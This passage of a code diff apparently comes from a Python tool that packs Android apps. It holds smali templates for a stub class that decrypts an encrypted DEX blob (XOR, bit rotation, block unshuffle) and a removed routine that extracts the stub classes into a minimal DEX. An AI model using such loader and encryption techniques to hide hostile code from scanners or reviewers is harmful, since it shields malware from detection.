+    aget-byte v2, p0, v0
+    shl-int/lit8 v2, v2, 0x18
+    ushr-int/lit8 v2, v2, 0x18
+    shl-int/lit8 v2, v2, 0x18
+    or-int/2addr v1, v2
+    # v1 = orig_len
+
+    # padded_n = blob.length - 4
     array-length v0, p0
-    # v0 = n
+    add-int/lit8 v0, v0, -4
+    # v0 = padded_n
 
-    # buf = p0.clone()
-    invoke-virtual {{p0}}, Ljava/lang/Object;->clone()Ljava/lang/Object;
-    move-result-object v1
-    check-cast v1, [B
-    # v1 = buf
+    new-array v3, v0, [B
 
-    # indices = new int[n]; fill 0..n-1
-    new-array v2, v0, [I
-    const/4 v6, 0x0
-    :fill_idx
-    if-ge v6, v0, :fill_done
-    aput v6, v2, v6
-    add-int/lit8 v6, v6, 0x1
-    goto :fill_idx
-    :fill_done
-
-    # state (long) = (long)(p1 & 0xFFFFFFFF)
-    int-to-long v3, p1
-    const-wide/32 v5, -1
-    and-long/2addr v3, v5
-    # v3:v4 = state
-
-    # i = n-1
-    add-int/lit8 v6, v0, -1
-    # v6 = i
-
-    :shuffle_loop
-    if-lez v6, :shuffle_done
-
-    # state = (state * LCG_MUL + LCG_ADD) & MASK
-    const-wide/32 v5, 0x41C64E6D
-    mul-long/2addr v3, v5
-    const-wide/32 v5, 0x3039
-    add-long/2addr v3, v5
-    const-wide/32 v5, -1
-    and-long/2addr v3, v5
-
-    # j = Integer.remainderUnsigned((int)state, i+1)
-    long-to-int v5, v3         # v5 = (int)(state & 0xFFFFFFFF)
-    add-int/lit8 v7, v6, 0x1   # v7 = i+1 (divisor)
-    invoke-static {{v5, v7}}, Ljava/lang/Integer;->remainderUnsigned(II)I
-    move-result v7
-    # v7 = j
-
-    # swap(indices[i], indices[j])
-    aget v5, v2, v6        # v5 = indices[i]   (tmp)
-    aget v0, v2, v7        # v0 = indices[j]   ← save n! restore after loop
-    aput v0, v2, v6        # indices[i] = indices[j]
-    aput v5, v2, v7        # indices[j] = tmp
-    # Restore n (v0 was overwritten — restore from array-length)
-    array-length v0, p0
-
-    add-int/lit8 v6, v6, -1   # i--
-    goto :shuffle_loop
-
-    :shuffle_done
-
-    # Apply INVERSE permutation: unpermuted[i] = buf[indices[i]]
-    # (encrypt did: result[indices[i]] = buf[i], so inverse: unpermuted[i] = buf[indices[i]])
-    new-array v5, v0, [B
-    const/4 v6, 0x0
-    :unperm_loop
-    if-ge v6, v0, :unperm_done
-    aget v7, v2, v6            # v7 = indices[i]
-    aget-byte v7, v1, v7       # v7 = buf[indices[i]]
-    aput-byte v7, v5, v6       # unpermuted[i] = buf[indices[i]]
-    add-int/lit8 v6, v6, 0x1
-    goto :unperm_loop
-    :unperm_done
-    # v5 = unpermuted
-
-    # Reverse nibble swap: swap low/high nibbles of each byte
-    const/4 v6, 0x0
-    :nibble_loop
-    if-ge v6, v0, :nibble_done
-    aget-byte v7, v5, v6
-    and-int/lit16 v7, v7, 0xFF   # v7 = unsigned byte
-    move v1, v7
-    and-int/lit8 v1, v1, 0xF    # v1 = low nibble
-    shl-int/lit8 v1, v1, 0x4    # v1 = low nibble << 4
-    ushr-int/lit8 v7, v7, 0x4   # v7 = high nibble (unsigned shift)
-    or-int/2addr v1, v7          # v1 = swapped byte
-    int-to-byte v1, v1
-    aput-byte v1, v5, v6
-    add-int/lit8 v6, v6, 0x1
-    goto :nibble_loop
-    :nibble_done
-
-    # XOR keystream (same as encrypt)
-    # Rebuild state from seed for keystream
-    int-to-long v3, p1
-    const-wide/32 v1, -1
-    and-long/2addr v3, v1
-    # v3:v4 = state
-
-    const/4 v6, 0x0
+    # Step 1: XOR reverse
+    const/4 v4, 0x0
     :xor_loop
-    if-ge v6, v0, :xor_done
-
-    const-wide/32 v1, 0x41C64E6D
-    mul-long/2addr v3, v1
-    const-wide/32 v1, 0x3039
-    add-long/2addr v3, v1
-    const-wide/32 v1, -1
-    and-long/2addr v3, v1
-
-    # ks_byte = (state >> 16) & 0xFF
-    const/16 v7, 0x10
-    ushr-long v1, v3, v7       # v1:v2 = state >> 16
-    long-to-int v1, v1
-    and-int/lit16 v1, v1, 0xFF  # v1 = ks_byte
-
-    aget-byte v7, v5, v6
-    and-int/lit16 v7, v7, 0xFF
-    xor-int/2addr v7, v1
-    int-to-byte v7, v7
-    aput-byte v7, v5, v6
-
-    add-int/lit8 v6, v6, 0x1
+    if-ge v4, v0, :xor_done
+    add-int/lit8 v5, v4, 0x4
+    aget-byte v5, p0, v5
+    const/16 v6, 0x20
+    rem-int v7, v4, v6
+    aget-byte v7, p2, v7
+    xor-int/2addr v5, v7
+    int-to-byte v5, v5
+    aput-byte v5, v3, v4
+    add-int/lit8 v4, v4, 0x1
     goto :xor_loop
     :xor_done
 
-    return-object v5
+    # Step 2: Rotation reverse
+    const/4 v4, 0x0
+    :rot_loop
+    if-ge v4, v0, :rot_done
+    aget-byte v5, v3, v4
+    shl-int/lit8 v5, v5, 0x18
+    ushr-int/lit8 v5, v5, 0x18
+    const/4 v6, 0x7
+    rem-int v6, v4, v6
+    add-int/lit8 v6, v6, 0x1
+    ushr-int v7, v5, v6
+    const/16 v8, 0x8
+    sub-int/2addr v8, v6
+    shl-int v8, v5, v8
+    or-int/2addr v7, v8
+    shl-int/lit8 v7, v7, 0x18
+    ushr-int/lit8 v7, v7, 0x18
+    int-to-byte v7, v7
+    aput-byte v7, v3, v4
+    add-int/lit8 v4, v4, 0x1
+    goto :rot_loop
+    :rot_done
+
+    # Step 3: Block unshuffle
+    const/16 v4, 0x100
+    div-int v5, v0, v4
+    # v5 = n_blocks
+
+    new-array v6, v5, [I
+    const/4 v7, 0x0
+    :bidx_loop
+    if-ge v7, v5, :bidx_done
+    aput v7, v6, v7
+    add-int/lit8 v7, v7, 0x1
+    goto :bidx_loop
+    :bidx_done
+
+    move v7, p1
+    add-int/lit8 v8, v5, -1
+    :bperm_loop
+    if-lez v8, :bperm_done
+    const v4, 0x41C64E6D
+    mul-int/2addr v7, v4
+    const/16 v4, 0x3039
+    add-int/2addr v7, v4
+    add-int/lit8 v4, v8, 0x1
+    invoke-static {{v7, v4}}, L{_pkg_path}/{app_class_name};->um(II)I
+    move-result v4
+    aget v2, v6, v8
+    aget v5, v6, v4
+    aput v5, v6, v8
+    aput v2, v6, v4
+    add-int/lit8 v8, v8, -1
+    goto :bperm_loop
+    :bperm_done
+
+    new-array v2, v0, [B
+
+    array-length v5, v6
+    const/4 v4, 0x0
+    :bunshuffle_loop
+    if-ge v4, v5, :bunshuffle_done
+    const/16 v5, 0x100
+    mul-int v7, v4, v5
+    aget v8, v6, v4
+    mul-int v8, v8, v5
+    invoke-static {{v3, v7, v2, v8, v5}}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V
+    add-int/lit8 v4, v4, 0x1
+    array-length v5, v6
+    goto :bunshuffle_loop
+    :bunshuffle_done
+
+    # Step 4: Trim to orig_len
+    new-array v3, v1, [B
+    const/4 v4, 0x0
+    invoke-static {{v2, v4, v3, v4, v1}}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V
+    return-object v3
 .end method
 """
 
-
-def _build_stub_dex(real_dex: bytes, new_path: str, renamed_app: str) -> bytes:
-    """
-    Extract ONLY the two stub classes (DexStub + renamed App) from the fully
-    compiled DEX and emit a valid minimal DEX-035 containing just those two
-    class_defs with all their referenced strings/types/protos/fields/methods/code.
-
-    Algorithm:
-      1. Parse DEX-035 header → locate all section offsets/sizes.
-      2. Walk class_def_item list; keep entries whose type descriptor matches
-         L<new_path>/DexStub;  or  L<new_path>/<renamed_app>;
-      3. Collect the transitive closure of all items those two class_defs reference
-         (strings, types, protos, fields, methods, code_items, annotations, etc.)
-         by walking their class_data and method code offsets.
-      4. Re-index every id (string_id, type_id, proto_id, field_id, method_id)
-         to a compact new table containing only the kept items.
-      5. Serialise a valid DEX-035 with the compact tables and update the header
-         (file_size, checksum, SHA-1, map offsets).
-
-    Returns raw bytes of the minimal stub DEX.
-    """
-    import struct as _s
-    import hashlib as _hl
-    import zlib as _zl
-
-    data = real_dex
-
-    # ── 1. Parse header ────────────────────────────────────────────────────────
-    def u32(off): return _s.unpack_from("<I", data, off)[0]
-    def u16(off): return _s.unpack_from("<H", data, off)[0]
-
-    magic = data[:8]
-    # Accept dex\n035\0 or dex\n039\0
-    if not magic.startswith(b"dex\n"):
-        raise ValueError(f"_build_stub_dex: not a DEX file (magic={magic!r})")
-
-    # Exact DEX-035 header layout (AOSP dalvik/libdex/DexFile.h):
-    # 0x00  magic[8]
-    # 0x08  checksum[4]
-    # 0x0C  sha1[20]
-    # 0x20  file_size[4]
-    # 0x24  header_size[4]
-    # 0x28  endian_tag[4]
-    # 0x2C  link_size[4]
-    # 0x30  link_off[4]
-    # 0x34  map_off[4]
-    # 0x38  string_ids_size[4]
-    # 0x3C  string_ids_off[4]
-    # 0x40  type_ids_size[4]
-    # 0x44  type_ids_off[4]
-    # 0x48  proto_ids_size[4]
-    # 0x4C  proto_ids_off[4]
-    # 0x50  field_ids_size[4]
-    # 0x54  field_ids_off[4]
-    # 0x58  method_ids_size[4]
-    # 0x5C  method_ids_off[4]
-    # 0x60  class_defs_size[4]
-    # 0x64  class_defs_off[4]
-    # 0x68  data_size[4]
-    # 0x6C  data_off[4]
-
-    str_ids_size = u32(0x38);  str_ids_off  = u32(0x3C)
-    typ_ids_size = u32(0x40);  typ_ids_off  = u32(0x44)
-    pro_ids_size = u32(0x48);  pro_ids_off  = u32(0x4C)
-    fld_ids_size = u32(0x50);  fld_ids_off  = u32(0x54)
-    met_ids_size = u32(0x58);  met_ids_off  = u32(0x5C)
-    cls_defs_size= u32(0x60);  cls_defs_off = u32(0x64)
-
-    # ── 2. Build string table (index → raw string bytes incl MUTF-8 length) ───
-    str_data_offsets = [u32(str_ids_off + i*4) for i in range(str_ids_size)]
-
-    def read_mutf8_str(off):
-        """Return (utf16_size, byte_len, raw_bytes_no_nul) at data offset off.
-
-        DEX string_data_item layout (AOSP dalvik/libdex/DexFile.h):
-            uleb128  utf16_size   -- number of UTF-16 code units (ONE prefix only)
-            MUTF-8 bytes         -- actual string content
-            0x00                 -- null terminator
-
-        There is NO second length field.  The previous code wrongly read TWO
-        prefixes, consuming the first byte of the string content as 'byte_len',
-        which corrupted every descriptor and made class lookup always fail.
-        """
-        pos = off
-        # Decode one proper ULEB128 (variable length, 7 bits per byte, LSB first)
-        utf16_size = 0
-        shift = 0
-        while True:
-            b = data[pos]; pos += 1
-            utf16_size |= (b & 0x7F) << shift
-            if not (b & 0x80):
-                break
-            shift += 7
-        # Scan to NUL to get the actual byte length (handles multi-byte MUTF-8
-        # where utf16_size != byte_size, e.g. supplementary chars encoded as
-        # two 3-byte MUTF-8 sequences).
-        end = pos
-        while data[end] != 0:
-            end += 1
-        raw = data[pos:end]
-        return utf16_size, len(raw), raw
-
-    def str_value(idx):
-        """Return decoded string for string index idx."""
-        _, _, raw = read_mutf8_str(str_data_offsets[idx])
-        return raw.decode("utf-8", errors="replace")
-
-    # ── 3. Build type descriptor list ─────────────────────────────────────────
-    type_str_idx = [u32(typ_ids_off + i*4) for i in range(typ_ids_size)]
-
-    def type_desc(tid): return str_value(type_str_idx[tid])
-
-    # ── 4. Identify the two target class_defs ─────────────────────────────────
-    STUB_DESC = f"L{new_path}/DexStub;"
-    APP_DESC  = f"L{new_path}/{renamed_app};"
-
-    CLASS_DEF_SIZE = 32   # 8 × uint32
-    target_class_idxs = []   # indices into class_def list
-    for ci in range(cls_defs_size):
-        off = cls_defs_off + ci * CLASS_DEF_SIZE
-        class_type_idx = u32(off)
-        desc = type_desc(class_type_idx)
-        if desc in (STUB_DESC, APP_DESC):
-            target_class_idxs.append(ci)
-
-    if len(target_class_idxs) != 2:
-        found = []
-        for ci in range(cls_defs_size):
-            off = cls_defs_off + ci * CLASS_DEF_SIZE
-            found.append(type_desc(u32(off)))
-        raise ValueError(
-            f"_build_stub_dex: expected 2 stub classes, found {len(target_class_idxs)}.\n"
-            f"Looking for: {STUB_DESC!r}, {APP_DESC!r}\n"
-            f"First 20 class descriptors in DEX: {found[:20]}"
-        )
-
-    print(f"  [stub_dex] Found target classes at def indices: {target_class_idxs}")
-
-    # ── 5. Collect referenced ids transitively ────────────────────────────────
-    kept_str_idxs  = set()
-    kept_typ_idxs  = set()
-    kept_pro_idxs  = set()
-    kept_fld_idxs  = set()
-    kept_met_idxs  = set()
-
-    # Proto_id_item: shorty_idx(u32), return_type_idx(u32), params_off(u32)
-    def collect_proto(pid):
-        if pid >= pro_ids_size: return   # bounds guard — DEX 039 may ref out-of-range protos
-        if pid in kept_pro_idxs: return
-        kept_pro_idxs.add(pid)
-        base = pro_ids_off + pid * 12
-        shorty_idx   = u32(base)
-        ret_type_idx = u32(base + 4)
-        params_off   = u32(base + 8)
-        if shorty_idx < str_ids_size:
-            kept_str_idxs.add(shorty_idx)
-        collect_type(ret_type_idx)
-        if params_off:
-            # type_list: size(u32) + type_idx[size](u16 each)
-            count = u32(params_off)
-            for k in range(count):
-                t = u16(params_off + 4 + k*2)
-                collect_type(t)
-
-    def collect_type(tid):
-        if tid >= typ_ids_size: return   # bounds guard — DEX 039 may produce out-of-range type refs
-        if tid in kept_typ_idxs: return
-        kept_typ_idxs.add(tid)
-        kept_str_idxs.add(type_str_idx[tid])
-
-    def collect_field(fid):
-        if fid >= fld_ids_size: return   # bounds guard — wrong idx from delta-decode or DEX 039
-        if fid in kept_fld_idxs: return
-        kept_fld_idxs.add(fid)
-        # field_id_item: class_idx(u16), type_idx(u16), name_idx(u32)
-        base = fld_ids_off + fid * 8
-        collect_type(u16(base))
-        collect_type(u16(base + 2))
-        name_idx = u32(base + 4)
-        if name_idx < str_ids_size:
-            kept_str_idxs.add(name_idx)
-
-    def collect_method(mid):
-        if mid >= met_ids_size: return   # bounds guard — wrong idx from delta-decode or DEX 039
-        if mid in kept_met_idxs: return
-        kept_met_idxs.add(mid)
-        # method_id_item: class_idx(u16), proto_idx(u16), name_idx(u32)
-        base = met_ids_off + mid * 8
-        collect_type(u16(base))
-        collect_proto(u16(base + 2))
-        name_idx = u32(base + 4)
-        if name_idx < str_ids_size:
-            kept_str_idxs.add(name_idx)
-
-    def collect_code_item(code_off):
-        """Scan code_item for string/type/field/method references in bytecode."""
-        if not code_off: return
-        # code_item header: registers_size(u16), ins_size(u16), outs_size(u16),
-        #   tries_size(u16), debug_info_off(u32), insns_size(u32), insns[insns_size](u16)
-        tries_size = u16(code_off + 6)
-        insns_size = u32(code_off + 12)
-        insns_start = code_off + 16
-        # Walk instructions looking for const-string (0x1A, 0x1B),
-        # const-class (0x1C), new-instance (0x22), check-cast (0x1F),
-        # invoke-* (0x6E-0x72, 0x74-0x78), iget/iput (0x52-0x5F),
-        # sget/sput (0x60-0x6D), instance-of (0x20), new-array (0x23),
-        # filled-new-array (0x24,0x25)
-        pos = insns_start
-        end = insns_start + insns_size * 2
-        while pos < end:
-            if pos + 2 > len(data): break
-            opcode = data[pos]
-            # Determine instruction size and extract index
-            if opcode in (0x1A,):          # const-string vA, string@BBBB
-                if pos + 4 <= len(data):
-                    sidx = u16(pos + 2)
-                    kept_str_idxs.add(sidx)
-                pos += 4
-            elif opcode in (0x1B,):        # const-string/jumbo vAA, string@BBBBBBBB
-                if pos + 6 <= len(data):
-                    sidx = _s.unpack_from("<I", data, pos + 2)[0]
-                    kept_str_idxs.add(sidx)
-                pos += 6
-            elif opcode in (0x1C, 0x1F, 0x20, 0x22, 0x23):  # const-class/check-cast/instance-of/new-instance/new-array
-                if pos + 4 <= len(data):
-                    tidx = u16(pos + 2)
-                    collect_type(tidx)
-                pos += 4
-            elif opcode in (0x24, 0x25):   # filled-new-array
-                if pos + 6 <= len(data):
-                    tidx = u16(pos + 2)
-                    collect_type(tidx)
-                pos += 6
-            elif 0x52 <= opcode <= 0x6D:   # iget/iput/sget/sput families
-                if pos + 4 <= len(data):
-                    fidx = u16(pos + 2)
-                    collect_field(fidx)
-                pos += 4
-            elif 0x6E <= opcode <= 0x72:   # invoke-* (5-reg form)
-                if pos + 6 <= len(data):
-                    midx = u16(pos + 2)
-                    collect_method(midx)
-                pos += 6
-            elif 0x74 <= opcode <= 0x78:   # invoke-*/range
-                if pos + 6 <= len(data):
-                    midx = u16(pos + 2)
-                    collect_method(midx)
-                pos += 6
-            elif opcode == 0x00:           # nop / packed-switch-payload / sparse-switch-payload / fill-array-data
-                if pos + 2 > len(data): break
-                pseudo = u16(pos)
-                if pseudo == 0x0100:       # packed-switch-payload
-                    if pos + 4 > len(data): break
-                    sz = u16(pos + 2)
-                    pos += 8 + sz * 4
-                elif pseudo == 0x0200:     # sparse-switch-payload
-                    if pos + 4 > len(data): break
-                    sz = u16(pos + 2)
-                    pos += 4 + sz * 8
-                elif pseudo == 0x0300:     # fill-array-data-payload
-                    if pos + 8 > len(data): break
-                    elem = u16(pos + 2)
-                    sz   = u32(pos + 4)
-                    total = 8 + (elem * sz + 1) // 2 * 2
-                    pos += total
-                else:
-                    pos += 2
-            else:
-                # Complete canonical Dalvik opcode width table (bytes = 16-bit units * 2).
-                # Source: Dalvik bytecode spec (AOSP dalvik/libdex/DexOpcodes.h).
-                # 6 bytes (3 units): const-string/jumbo(0x1B), filled-new-array(0x24,0x25),
-                #   fill-array-data(0x26), goto/32(0x2A), packed-switch(0x2B),
-                #   sparse-switch(0x2C), invoke-*(0x6E-0x72, 0x74-0x78) — already handled above.
-                # 4 bytes (2 units): most 2-reg ops with index or literal.
-                # 2 bytes (1 unit): everything else.
-                _DALVIK_6 = frozenset((
-                    0x1B,                         # const-string/jumbo
-                    0x24, 0x25,                   # filled-new-array / filled-new-array/range
-                    0x26,                         # fill-array-data
-                    0x2A,                         # goto/32
-                    0x2B, 0x2C,                   # packed-switch, sparse-switch
-                    # 0x6E-0x72, 0x74-0x78 already handled in primary chain
-                ))
-                _DALVIK_4 = frozenset((
-                    0x12, 0x13, 0x14, 0x15,       # const/4, const/16, const, const/high16
-                    0x16, 0x17, 0x18, 0x19,       # const-wide/16, const-wide/32, const-wide, const-wide/high16
-                    0x1A,                         # const-string (already handled, but kept for safety)
-                    0x1C,                         # const-class (already handled, but kept for safety)
-                    0x1F, 0x20,                   # check-cast, instance-of (already handled)
-                    0x22, 0x23,                   # new-instance, new-array (already handled)
-                    0x29,                         # goto/16
-                    0x2D, 0x2E, 0x2F, 0x30, 0x31, # cmpl-float..cmp-long
-                    0x32, 0x33, 0x34, 0x35, 0x36, 0x37,  # if-eq..if-lez
-                    0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D,  # if-eqz..if-lez (zero)
-                    0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
-                    0x50, 0x51,                   # aget/aput families
-                    # 0x52-0x6D iget/iput/sget/sput already handled in primary chain
-                    0x7B, 0x7C, 0x7D, 0x7E, 0x7F, # unop families
-                    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B,
-                    0x8C, 0x8D, 0x8E, 0x8F,
-                    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B,
-                    0x9C, 0x9D, 0x9E, 0x9F,
-                    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB,
-                    0xAC, 0xAD, 0xAE, 0xAF,
-                    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB,
-                    0xBC, 0xBD, 0xBE, 0xBF,
-                    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB,
-                    0xCC, 0xCD, 0xCE, 0xCF,
-                    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, # binop/2addr,  binop/lit16
-                    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF, # binop/lit8
-                    0xE0, 0xE1, 0xE2, 0xE3,       # binop/lit8 continued
-                ))
-                if opcode in _DALVIK_6:
-                    pos += 6
-                elif opcode in _DALVIK_4:
-                    pos += 4
-                else:
-                    pos += 2  # 1-unit: nop-like, move, return, throw, monitor, etc.
-
-    def read_uleb128(off):
-        result = 0; shift = 0; pos = off
-        while True:
-            b = data[pos]; pos += 1
-            result |= (b & 0x7F) << shift
-            if not (b & 0x80): break
-            shift += 7
-        return result, pos - off
-
-    def collect_class_data(class_data_off):
-        if not class_data_off: return
-        pos = class_data_off
-        # class_data_item: uleb128 × 4 counts, then field/method items
-        sf_count, n = read_uleb128(pos); pos += n
-        if_count, n = read_uleb128(pos); pos += n
-        dm_count, n = read_uleb128(pos); pos += n
-        vm_count, n = read_uleb128(pos); pos += n
-
-        def read_encoded_fields(count, start_idx=0):
-            nonlocal pos
-            idx = start_idx
-            for _ in range(count):
-                diff, n = read_uleb128(pos); pos += n
-                idx += diff
-                _flags, n = read_uleb128(pos); pos += n
-                collect_field(idx)
-            return idx  # last absolute idx, chain into if pass
-
-        def read_encoded_methods(count, start_idx=0):
-            nonlocal pos
-            idx = start_idx
-            for _ in range(count):
-                diff,  n = read_uleb128(pos); pos += n
-                idx += diff
-                _flags, n = read_uleb128(pos); pos += n
-                code_off, n = read_uleb128(pos); pos += n
-                collect_method(idx)
-                collect_code_item(code_off)
-            return idx  # last absolute idx, chain into vm pass
-
-        last_sf_idx = read_encoded_fields(sf_count, start_idx=0)
-        read_encoded_fields(if_count, start_idx=last_sf_idx)
-        last_dm_idx = read_encoded_methods(dm_count, start_idx=0)
-        read_encoded_methods(vm_count, start_idx=last_dm_idx)
-
-    # Walk the two target class_defs
-    for ci in target_class_idxs:
-        base = cls_defs_off + ci * CLASS_DEF_SIZE
-        # class_def_item layout (AOSP dalvik/libdex/DexFile.h):
-        #   +0  class_idx          uint32
-        #   +4  access_flags       uint32   ← was missing, shifted every field by -4
-        #   +8  superclass_idx     uint32
-        #   +12 interfaces_off     uint32
-        #   +16 source_file_idx    uint32
-        #   +20 annotations_off    uint32
-        #   +24 class_data_off     uint32
-        #   +28 static_values_off  uint32
-        class_type_idx    = u32(base)
-        superclass_idx    = u32(base +  8)   # 0xFFFFFFFF = none
-        interfaces_off    = u32(base + 12)
-        source_file_idx   = u32(base + 16)   # 0xFFFFFFFF = none
-        annotations_off   = u32(base + 20)
-        class_data_off    = u32(base + 24)
-        static_values_off = u32(base + 28)
-
-        collect_type(class_type_idx)
-        if superclass_idx != 0xFFFFFFFF:
-            collect_type(superclass_idx)
-        if source_file_idx != 0xFFFFFFFF:
-            kept_str_idxs.add(source_file_idx)
-        if interfaces_off:
-            count = u32(interfaces_off)
-            for k in range(count):
-                collect_type(u16(interfaces_off + 4 + k*2))
-        collect_class_data(class_data_off)
-        # static_values_off: encoded_array; we copy the raw bytes later, no id refs needed
-
-    print(f"  [stub_dex] Collect done: kept {len(kept_met_idxs)}/{met_ids_size} methods, "
-          f"{len(kept_typ_idxs)}/{typ_ids_size} types, {len(kept_fld_idxs)}/{fld_ids_size} fields, "
-          f"{len(kept_str_idxs)}/{str_ids_size} strings")
-    if kept_met_idxs:
-        print(f"  [stub_dex] Method idx range kept: {min(kept_met_idxs)}..{max(kept_met_idxs)}")
-
-    # ── 6. Build compact re-mapping tables ────────────────────────────────────
-    # Sort kept sets to get deterministic ordering
-    new_str_ids  = sorted(kept_str_idxs)
-    new_typ_ids  = sorted(kept_typ_idxs)
-    new_pro_ids  = sorted(kept_pro_idxs)
-    new_fld_ids  = sorted(kept_fld_idxs)
-    new_met_ids  = sorted(kept_met_idxs)
-
-    str_remap = {old: new for new, old in enumerate(new_str_ids)}
-    typ_remap = {old: new for new, old in enumerate(new_typ_ids)}
-    pro_remap = {old: new for new, old in enumerate(new_pro_ids)}
-    fld_remap = {old: new for new, old in enumerate(new_fld_ids)}
-    met_remap = {old: new for new, old in enumerate(new_met_ids)}
-
-    print(f"  [stub_dex] Compact tables: {len(new_str_ids)} str, {len(new_typ_ids)} type, "
-          f"{len(new_pro_ids)} proto, {len(new_fld_ids)} field, {len(new_met_ids)} method")
-
-    # ── 7. Serialise the new DEX ───────────────────────────────────────────────
-    # We build sections as bytearrays, then lay them out after the 112-byte header.
-    # Alignment: string_id/type_id/proto_id/field_id/method_id/class_def = 4-byte aligned.
-    # string_data_item = no alignment. code_item = 4-byte aligned.
-
-    def uleb128(v):
-        out = []
-        while True:
-            b = v & 0x7F; v >>= 7
-            if v: out.append(b | 0x80)
-            else: out.append(b); break
-        return bytes(out)
-
-    def align4(buf):
-        r = len(buf) % 4
-        if r: buf += b'\x00' * (4 - r)
-        return buf
-
-    def pack32(*vals): return _s.pack("<" + "I"*len(vals), *vals)
-    def pack16(*vals): return _s.pack("<" + "H"*len(vals), *vals)
-
-    # ── 7a. String data section ───────────────────────────────────────────────
-    str_data_sec = bytearray()
-    str_data_rel_offsets = []   # offset within str_data_sec for each new string
-    for old_idx in new_str_ids:
-        str_data_rel_offsets.append(len(str_data_sec))
-        utf16_size, _byte_len, raw = read_mutf8_str(str_data_offsets[old_idx])
-        # DEX string_data_item: ONE ULEB128 (utf16_size) + raw MUTF-8 bytes + NUL.
-        # No second length field.  encode as proper ULEB128.
-        def encode_uleb128(v):
-            out = []
-            while True:
-                b = v & 0x7F
-                v >>= 7
-                if v:
-                    out.append(b | 0x80)
-                else:
-                    out.append(b)
-                    break
-            return bytes(out)
-        str_data_sec += encode_uleb128(utf16_size) + raw + b'\x00'
-
-    # ── 7b. Type-list blobs needed by proto parameters ────────────────────────
-    # Collect raw type_list blobs for proto params, re-mapped
-    proto_param_blobs = {}   # new proto idx → bytes (or b'' if no params)
-    for old_pid in new_pro_ids:
-        base = pro_ids_off + old_pid * 12
-        params_off = u32(base + 8)
-        if params_off:
-            count = u32(params_off)
-            blob = pack32(count)
-            for k in range(count):
-                old_t = u16(params_off + 4 + k*2)
-                blob += pack16(typ_remap[old_t])
-            blob = align4(bytearray(blob))
-            proto_param_blobs[pro_remap[old_pid]] = bytes(blob)
-        else:
-            proto_param_blobs[pro_remap[old_pid]] = b''
-
-    # ── 7c. Remap and copy code_items ─────────────────────────────────────────
-    # We'll copy the code bytes verbatim but re-index references inline.
-    # Strategy: copy the full code_item raw bytes from source, then patch
-    # the instruction stream for any 16/32-bit index references.
-
-    def remap_code_item(code_off):
-        """Return remapped raw code_item bytes."""
-        if not code_off: return b''
-        tries_size = u16(code_off + 6)
-        insns_size = u32(code_off + 12)
-        insns_end  = code_off + 16 + insns_size * 2
-        # tries are 4-byte aligned after insns
-        if tries_size and (insns_size % 2):
-            padding = 2
-        else:
-            padding = 0
-        tries_end = insns_end + padding + tries_size * 8
-        # handlers follow tries
-        # We take the full raw span and patch indices in-place
-        # Determine full code_item size: walk handlers if present
-        handlers_end = tries_end
-
-        # ── HYBRID DEBUG: code_item header ───────────────────────────────────
-        print(f"  [DBG_CODE] code_off=0x{code_off:08X} tries_size={tries_size}"
-              f" insns_size={insns_size} insns_end=0x{insns_end:08X}"
-              f" padding={padding} tries_end=0x{tries_end:08X}")
-
-        if tries_size:
-            # encoded_catch_handler_list
-            n_list, nb = read_uleb128(tries_end)
-            hpos = tries_end + nb
-
-            # ── HYBRID DEBUG: handler list header ────────────────────────────
-            print(f"  [DBG_HAND] handler_list_start=0x{tries_end:08X}"
-                  f" n_list_uleb_bytes={nb} n_list={n_list}"
-                  f" raw_size_byte=0x{data[tries_end]:02X}")
-
-            # Walk each try block to log handler_off values
-            try_base = insns_end + padding
-            for ti in range(tries_size):
-                t_off = try_base + ti * 8
-                t_start = _s.unpack_from("<I", data, t_off)[0]
-                t_count = _s.unpack_from("<H", data, t_off + 4)[0]
-                t_hoff  = _s.unpack_from("<H", data, t_off + 6)[0]
-                print(f"  [DBG_TRY_{ti}] start_addr={t_start} insn_count={t_count}"
-                      f" handler_off={t_hoff} (points to byte 0x{tries_end+t_hoff:08X}"
-                      f" in data, rel={t_hoff} into handler_list)")
-
-            for hi in range(n_list):
-                n_pairs, nb2 = read_uleb128(hpos)
-                handler_entry_abs = hpos
-                handler_entry_rel = hpos - tries_end
-                hpos += nb2
-                catch_all = (n_pairs <= 0)
-                print(f"  [DBG_HAND_{hi}] entry_abs=0x{handler_entry_abs:08X}"
-                      f" entry_rel={handler_entry_rel} n_pairs_raw={n_pairs}"
-                      f" catch_all={catch_all} n_typed={abs(n_pairs)}")
-                for pi in range(abs(n_pairs)):
-                    t_idx_abs = hpos
-                    t_idx_rel = hpos - tries_end
-                    t_idx, nb3 = read_uleb128(hpos); hpos += nb3
-                    h_addr, nb4 = read_uleb128(hpos); hpos += nb4
-                    new_t = typ_remap.get(t_idx, t_idx)
-                    needs_2byte = (new_t >= 0x80)
-                    print(f"    [DBG_PAIR_{pi}] type_idx_abs=0x{t_idx_abs:08X}"
-                          f" type_idx_rel={t_idx_rel}"
-                          f" old_t={t_idx}(0x{t_idx:02X}) new_t={new_t}(0x{new_t:02X})"
-                          f" old_uleb_bytes={nb3} new_needs_2byte={needs_2byte}"
-                          f" handler_addr={h_addr}(0x{h_addr:04X})"
-                          f" raw_bytes={data[t_idx_abs:t_idx_abs+nb3+nb4].hex()}")
-                    if needs_2byte:
-                        print(f"    [DBG_CRITICAL] *** new_t={new_t} >= 0x80 — WILL NOT BE PATCHED"
-                              f" — old type_idx={t_idx} stays in raw — handler_addr MISALIGNED ***")
-                    if h_addr > insns_size * 2:
